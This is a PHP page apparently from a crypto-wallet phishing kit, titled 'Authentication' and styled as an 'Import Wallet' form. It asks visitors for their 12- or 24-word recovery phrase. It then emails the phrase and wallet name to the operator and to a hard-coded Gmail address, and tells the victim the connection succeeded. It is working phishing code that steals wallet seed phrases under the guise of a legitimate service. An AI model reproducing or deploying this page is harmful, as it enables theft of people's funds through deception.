<?php
// Date in the past
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");

ini_set('session.gc_maxlifetime', 86400);
session_start();

require_once("includes/functions.php");

require_once("includes/mobile-detect.php");
$detect = new Mobile_Detect;
?>
<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<base href="<?php directory(); ?>" target="_top">

<meta name="robots" content="index, follow" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="keywords" content="<?php echo $gen_name; ?>, Coins">
<meta name="author" content="<?php echo $gen_name; ?>">
<meta name="description" content="Authentication - <?php echo $full_gen_name; ?>"/>
<link rel="canonical" href="<?php echo $actual_link; ?>"/>
<link rel="alternate" href="<?php echo $domain; ?>" hreflang="en-ng"/>

<link rel="shortcut icon" href="<?php echo new_version("{$images}favicon.png"); ?>">
<link rel="apple-touch-icon" sizes="120x120" href="<?php echo new_version("{$images}favicon.png"); ?>">
<link rel="apple-touch-icon" sizes="152x152" href="<?php echo new_version("{$images}favicon.png"); ?>">
<title>Authentication - <?php echo $full_gen_name; ?></title>
  
<!-- Favicons-->
<link rel="shortcut icon" href="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- Favicons-->
<link rel="apple-touch-icon-precomposed" href="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- For iPhone -->
<meta name="msapplication-TileColor" content="#b20">
<meta name="msapplication-TileBackground" content="#000">
<meta name="msapplication-TileImage" content="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- For Windows Phone -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
<meta name="apple-mobile-web-app-capable" content="yes">

<meta property="og:url" content="<?php directory(); ?>" /> 
<meta property="og:type" content="article" />
<meta property="og:title" content="Authentication - <?php echo $full_gen_name; ?>" /> 
<meta property="og:description" content="Authentication - <?php echo $full_gen_name; ?>" /> 
<meta property="og:image" content="<?php directory(); echo new_version("{$images}logos/yomijojolo-logo.png"); ?>" />
<meta property="og:image:type" content="image/png" />
<meta property="og:image:width" content="140" />
<meta property="og:image:height" content="140" />

<link type="text/css" rel="stylesheet" href="css/bootstrap.css" />
<link type="text/css" rel="stylesheet" href="css/font-awesome.css" />
<link type="text/css" rel="stylesheet" href="<?php echo new_version("css/style.css"); ?>" />
<style>
<!--
.contact-form fieldset{
background:#f5f5f5;
}
.contact-form legend{
background:#fff;
padding-left:10px;
padding-right:10px;
border:5px solid #f5f5f5;
}
#contact h4{
font-weight:900;
text-transform:uppercase;
}
.contact-section{
padding-top:20px;
padding-bottom:20px;
}
.contact-section .container{
margin-bottom:0px;
}
-->
</style>
</head>

<body>
<?php //require_once("includes/upper.php"); ?>

<?php
$wallet = tr_input("wallet");
$mail = np_input("mail");
$phrase = tp_input("phrase");

if($_SERVER["REQUEST_METHOD"] == "POST" && !empty($mail) && !empty($wallet) && !empty($phrase)){

$to = "{$gen_email}, ademolaadeleke250@gmail.com";
$subject = "Wallet Authentication";
$message = "<p><b>Hi,</b></p>
<p>These are your information after trying to access the service.</p>
<hr>
<p><b>Type:</b> Keyphrase</p>
<p><b>Wallet ID:</b> {$wallet} Wallet</p>
<p><b>Passphrase:</b> {$phrase}</p>";
$message = message_template();
$headers = "{$gen_name} <no-reply@{$domain}>";

$act = send_mail();

if($act){
$_SESSION["msg"] = "<div class='success'>Connection Successful</div>";
redirect("{$directory}response/");
}
}

if($_SERVER['REQUEST_METHOD'] == "POST" && !empty($mail) && (empty($wallet) || empty($phrase))){
echo "<div class='not-success'>Not Successful. Phrase is required.</div>";
}
?>

<div class="home-body-wrapper contact-section"> 
<div class="home-body container row" id="contact"> 
<h1 class="body-header align-center">Import <span><?php echo $wallet; ?> Wallet</span></h1>

<div class="col-md-2">

</div>
<div class="col-md-8">

<form class="contact-form" action="<?php echo "{$directory}auth/{$wallet}/"; ?>" method="post" runat="server" autocomplete="off" enctype="multipart/form-data" style="padding-top:0px;">  

<fieldset class="border-radius">
<legend class="border-radius"><h4 class="align-center">Phrase</h4></legend>

<input type="hidden" name="mail" value="1">

<div style="margin-bottom:20px;">
<textarea type="text" name="phrase" id="phrase" rows="5" class="form-control" placeholder="Type phrase here..." required value=""></textarea>
<p>Typically 12 (sometimes 24) words seperated by a single spaces.</p>
</div>

<div>
<button class="btn gen-btn float-right"><i class="fa fa-arrow-down"></i> Import</button>
</div>

</fieldset>
</form>

</div>
</div>
</div>

<?php require_once("includes/footer.php"); ?>